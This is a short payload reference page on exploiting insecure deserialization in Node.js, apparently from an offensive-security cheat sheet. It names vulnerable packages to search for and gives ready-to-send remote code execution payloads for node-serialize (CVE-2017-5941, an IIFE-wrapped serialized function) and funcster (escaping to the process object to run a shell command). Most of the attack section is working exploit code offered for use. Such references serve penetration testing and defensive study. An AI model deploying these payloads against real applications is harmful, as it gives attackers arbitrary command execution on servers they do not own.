# Node Deserialization

## Summary

* [Exploit](#exploit)
    * [node-serialize](#node-serialize)
    * [funcster](#funcster)
* [References](#references)

## Exploit

* In Node source code, look for:
    * `node-serialize`
    * `serialize-to-js`
    * `funcster`

### node-serialize

> An issue was discovered in the node-serialize package 0.0.4 for Node.js. Untrusted data passed into the `unserialize()` function can be exploited to achieve arbitrary code execution by passing a JavaScript Object with an Immediately Invoked Function Expression (IIFE).

1. Generate a serialized payload
    ```js
    var y = {
        rce : function(){
            require('child_process').exec('ls /', function(error,
            stdout, stderr) { console.log(stdout) });
        },
    }
    var serialize = require('node-serialize');
    console.log("Serialized: \n" + serialize.serialize(y));
    ```
2. Add bracket `()` to force the execution
    ```js
    {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}
    ```
3. Send the payload

### funcster

```js
{"rce":{"__js_function":"function(){CMD=\"cmd /c calc\";const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()"}}
```


## References

* [Exploiting Node.js deserialization bug for Remote Code Execution (CVE-2017-5941) - Ajin Abraham](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)
* [NodeJS Deserialization - 8 January 2020- gonczor](https://blacksheephacks.pl/nodejs-deserialization/)
* [CVE-2017-5941 - NATIONAL VULNERABILITY DATABASE - 02/09/2017](https://nvd.nist.gov/vuln/detail/CVE-2017-5941)